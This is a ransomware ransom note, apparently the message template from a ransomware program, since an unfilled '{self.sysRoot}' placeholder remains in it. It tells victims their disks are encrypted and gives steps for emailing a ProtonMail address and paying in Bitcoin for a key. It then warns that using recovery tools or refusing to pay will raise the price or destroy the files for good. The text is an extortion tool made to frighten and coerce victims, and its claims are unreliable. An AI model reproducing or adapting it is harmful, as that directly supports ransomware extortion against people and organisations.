The harddisks of your computer have been encrypted with an Military grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!

To purchase your key and restore your data, please follow these three easy steps:

1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to GetYourFilesBack@protonmail.com

2. You will recieve your personal BTC address for payment.
   Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
   We will check to see if payment has been paid.

3. You will receive a text file with your KEY that will unlock all your files. 
   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.

WARNING:
Do NOT attempt to decrypt your files with any other software; it is obsolete and will not work, potentially increasing the cost to unlock your files.
Do NOT change file names, tamper with the files, or use any decryption software, as this may increase the cost and there is a high risk of permanently losing your files.
Do NOT send a "PAID" email without actually making the payment; the price will increase for non-compliance.
Do NOT assume we won't discard your key if you refuse to pay. We will.
